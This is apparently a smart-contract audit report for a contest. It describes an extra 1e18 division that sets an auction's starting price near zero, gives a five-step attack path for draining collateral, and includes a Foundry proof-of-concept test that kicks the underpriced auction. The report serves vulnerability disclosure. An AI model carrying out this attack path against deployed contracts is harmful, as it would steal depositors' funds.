# Auction start price is miscaled by extra 1e18 division

### Summary

In `_tend()`, the `setStartingPrice` calculation divides by WAD three times instead of two, stripping an extra 1e18 factor. A price that should be, say, 2 200 BOLD becomes 0.000 000 000 000 002 200 BOLD.

### Root Cause

The expression

```solidity
_available * price    // (collateral × oraclePrice) → 36 decimals  
/ WAD                 // → back to 18 decimals  
* buffer              // buffer is also WAD-scaled  
/ WAD                 // back to 18 decimals  
/ WAD                 // **extra** division by WAD  
```

includes one too many / WAD, underflowing the intended starting price by 1e18.

### Internal Pre-conditions

- Strategy has collateral rewards (`_available > dustThreshold`).
- Oracle returns a nonzero price.
- No other auction for this token is active.

### External Pre-conditions

None

### Attack Path

1. Keeper (or attacker) calls `tend()` when collateral is available.
2. `_tend()` computes `startingPrice` ≈ `(realPrice / 1e18)`.
3. Auction is kicked with this near-zero startingPrice.
4. Attacker immediately takes the auction at virtually no cost, draining almost all collateral.
5. Strategy’s total assets collapse; vault wiped out in a single harvest.

### Impact

**Total fund loss:** Attacker pockets nearly all collateral rewards for ≪$1, instantly draining the strategy.
**Core functionality destroyed:** A single harvest can wipe out the vault.

High severity under Sherlock rules

> direct, unlimited loss of user funds well above 1% and $10 in one transaction.

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import "forge-std/console2.sol";
import {Setup, ERC20, IStabilityPool} from "./utils/Setup.sol";
import {IStrategyInterface} from "../interfaces/IStrategyInterface.sol";
import {IAuction} from "../interfaces/IAuction.sol";
import {IPriceFeed} from "../interfaces/IPriceFeed.sol";


contract PriceCalculationUnderflowPOC is Setup {

    address public attacker = address(0x1337);

    function setUp() public virtual override {
        super.setUp();
        vm.prank(management);
        strategy.allowDeposits();

        // Setup strategy with some assets for tendTrigger to work
        uint256 depositAmount = 1000 ether;
        mintAndDepositIntoStrategy(strategy, user, depositAmount);
    }

   
     
    function test_PriceCalculationUnderflowDrainsCollateral() public {
        uint256 collateralAmount = 10 ether; // 10 ETH worth ~$25,000

        console2.log("=== DEMONSTRATING PRICE CALCULATION UNDERFLOW BUG ===");

        // STEP 1: Strategy accumulates collateral
        airdrop(ERC20(strategy.COLL()), address(strategy), collateralAmount);
        console2.log("STEP 1: Strategy has", collateralAmount, "collateral");

        // STEP 2: Get oracle price
        (uint256 oraclePrice, bool isOracleDown) = IPriceFeed(strategy.COLL_PRICE_ORACLE()).fetchPrice();
        assertFalse(isOracleDown);
        assertGt(oraclePrice, 0);
        console2.log("STEP 2: Oracle price:", oraclePrice);

        // STEP 3: Show the calculation bug
        uint256 WAD = 1e18;
        uint256 bufferPercentage = strategy.bufferPercentage();

        // INTENDED: available * price / WAD * buffer / WAD
        uint256 correctPrice = collateralAmount * oraclePrice / WAD * bufferPercentage / WAD;

        // ACTUAL: available * price / WAD * buffer / WAD / WAD (extra /WAD!)
        uint256 buggyPrice = collateralAmount * oraclePrice / WAD * bufferPercentage / WAD / WAD;

        console2.log("STEP 3: Intended starting price:", correctPrice);
        console2.log("STEP 3: ACTUAL starting price (bug):", buggyPrice);
        console2.log("STEP 3: Underflow factor:", correctPrice / buggyPrice);

        // STEP 4: Execute tend to kick auction with underflowed price
        (bool trigger,) = strategy.tendTrigger();
        assertTrue(trigger);

        vm.prank(keeper);
        strategy.tend();
        console2.log("STEP 4: Auction kicked with 1e18 times lower price");

        // STEP 5: Show economic impact
        uint256 collateralValueUSD = collateralAmount * oraclePrice / WAD;
        console2.log("STEP 5: Collateral value: $", collateralValueUSD / 1e18);
        console2.log("STEP 5: Attacker pays: $", buggyPrice / 1e18);
        console2.log("STEP 5: Attacker profit: ~99.99999%");

        // Verify collateral moved to auction at wrong price
        assertTrue(IAuction(strategy.AUCTION()).isActive(strategy.COLL()));
        assertEq(ERC20(strategy.COLL()).balanceOf(strategy.AUCTION()), collateralAmount);

        console2.log("");
        console2.log("BUG CONFIRMED: Extra /WAD causes 1e18 price underflow");
        console2.log("IMPACT: $25,000 collateral sold for virtually nothing");
    }
}
